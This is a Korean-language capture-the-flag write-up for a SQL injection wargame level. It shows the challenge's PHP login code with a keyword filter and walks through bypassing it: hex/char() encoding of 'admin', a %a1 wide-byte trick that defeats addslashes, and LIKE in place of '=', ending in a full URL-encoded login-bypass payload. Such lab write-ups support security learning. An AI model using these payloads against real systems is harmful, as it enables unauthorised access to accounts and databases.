# sql filtering bypass

단순 id, pw 로그인 폼이 있다. 
소스코드는 아래와 같다. 

```php
<?php
  include "../../config.php";
  if($_GET['view_source']) view_source();
?><html>
<head>
<title>Challenge 45</title>
</head>
<body>
<h1>SQL INJECTION</h1>
<form method=get>
id : <input name=id value=guest><br>
pw : <input name=pw value=guest><br>
<input type=submit>
</form>
<hr><a href=./?view_source=1>view-source</a><hr>
<?php
  if($_GET['id'] && $_GET['pw']){
    $db = dbconnect();
    $_GET['id'] = addslashes($_GET['id']);
    $_GET['pw'] = addslashes($_GET['pw']);
    $_GET['id'] = mb_convert_encoding($_GET['id'],'utf-8','euc-kr');
    if(preg_match("/admin|select|limit|pw|=|<|>/i",$_GET['id'])) exit();
    if(preg_match("/admin|select|limit|pw|=|<|>/i",$_GET['pw'])) exit();
    $result = mysqli_fetch_array(mysqli_query($db,"select id from chall45 where id='{$_GET['id']}' and pw=md5('{$_GET['pw']}')"));
    if($result){
      echo "hi {$result['id']}";
      if($result['id'] == "admin") solve(45);
    }
    else echo("Wrong");
  }
?>
</body>
</html>
```

id부분에 `admin' or 1#` 을 삽입하면 된다. 
하지만, `admin`이라는 문자가 `preg_match` 함수로 필터링이 되고, 
`addslashes` 함수가 `'` 따옴표 앞에 `\` 요 이스케이프를 자동으로 붙이면서 쓸 수가 없다. 
그리고 `=`도 못쓴다.

이걸 우회해야 한다.
일단 `admin` 문자 우회의 방법은 다음과 같다. 

```sql
-- char()함수
char(97,100,109,105,110)

-- 16진수로 인코딩(앞에 0x)
0x61646d696e

-- 2진수로 인코딩(앞에 0b)
0b0110000101100100011011010110100101101110
```

다음으로 `'` 를 삽입하기 위한 방법이다. 
`addslashes` 함수는 따옴표에 `\` 를 추가한다. 
따옴표앞에 멀티바이트 인코딩으로 인식될 수 있는 문자를 넣으면, 

```
문자\'
```

추후 `mb_convert_encoding` 함수에서

```
문자\ => 이걸 하나의 문자로 인식(문자가 멀티바이트로 인식되서 \까지 읽어버림)
```

그래서 `'` 가 이스케이프 없이 쓰일 수 있다. 

그럼 이 멀티바이트란 뭔가?

먼저 문자인코딩이란, 문자를 컴퓨터의 신호로 연결시킨것. 
그걸 위해서 문자마다 특정 숫자를 대응시켜서 '이 숫자가 무슨 문자인지를' 컴퓨터가 알도록 하는 방법이다. 

아스키는 1바이트, 128개의 문자를 연결시켜 인코딩을 한다.
utf-8 인코딩은 아스키와 달리 크기가 유동적이다. 
1바이트에서 4바이트까지 사용한다.  

2바이트로 쓰는게 멀티바이트이다. 16진수 범위는  0x80 ~ 0x7FF (128~2047까지)
[url에서 utf-8](https://namu.wiki/w/UTF-8#s-5)
[코드표](https://www.utf8-chartable.de/)

 `%a1~%fe` 까지가 2 byte로 인식된다. 

`=` 을 못 넣으니까 like를 이용한다. [설명](https://coding-factory.tistory.com/114)
그리고 인풋에 넣으면 띄어쓰기가 +로 변해서 안된다. 
URL에 직접삽입을 한다. 
그래서 먼저 `%a1'`이걸로 기존의 id쿼리를 닫는다. => `id='%a1'`
그리고 이어서 `or id=char(97,100,109,105,110)` 를 넣는다. 

```
-- 넣을값
id=%a1' or id like 0x61646d696e#

--진짜 넣을때는 url 인코딩해서 넣는다.
id=%a1%27%20or%20id%20like%200x61646d696e%23
```

그럼 해결이 된다. 

> admin처럼 특정 문자열의 필터링을 피하는 것은 쉽지만, 
> 따옴표, = 같은 문자를 우회하는 것은 까다로웠다. 
>
> 이번 문제를 풀면서 utf-8 인코딩의 방식에 대해서도 더 알게 되었고, 
> =을 대체할 수 있는 like 같은 SQL 구문에 대해서도 새로 배웠다. 
>
> 아직 url 인코딩, utf-8 인코딩의 방식에 대해서 구체적으로는 이해가 잘 안된다. 
> 앞으로 더 많은 문제를 풀면서 배우고 정리해나갔으면 좋겠다.